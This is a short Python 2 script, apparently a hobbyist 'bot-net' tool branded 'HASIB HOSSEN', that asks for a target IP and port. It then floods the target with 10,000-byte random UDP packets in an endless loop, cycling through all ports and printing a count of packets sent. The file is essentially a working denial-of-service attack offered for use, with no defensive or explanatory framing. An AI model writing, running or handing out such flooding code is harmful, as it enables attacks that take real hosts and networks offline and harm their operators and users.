#!/usr/bin

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

############## Settings ##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)
timeout =  time.time() 
############# Settings ##############

os.system ("clear")
print ('''
\033[38;5;46m
 ##  ##     ##      ####     ####    #####   
 ##  ##    ####    ##  ##     ##     ##  ##  
 ##  ##   ##  ##   ##         ##     ##  ##  
 ######   ######    ####      ##     #####   
 ##  ##   ##  ##       ##     ##     ##  ##  
 ##  ##   ##  ##   ##  ##     ##     ##  ##  
 ##  ##   ##  ##    ####     ####    #####   
       \033[38;5;46m[\033[91mPowered By : HASIB HOSSEN BOT-NET\033[92m]
         \033[38;5;46m[\033[94m127.0.0.1\033[93m]\033[95m|_|\033[93m[\033[94m127.217.21.78\033[93m]                                                                         
''')
ip = raw_input("ENTER TERGET IP: ")
port = input("ENTER PORT: ")

os.system("clear")
print "\033[91mMission Start HASIB BOT-NET"
os.system ("clear")
sent = 0
while True:
     while 1:
        if time.time() > timeout:
            break
        else:
            pass
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[92mSent %s packet to %s throught port:%s successful"%(sent,ip,port)
     if port == 65534:
       port = 1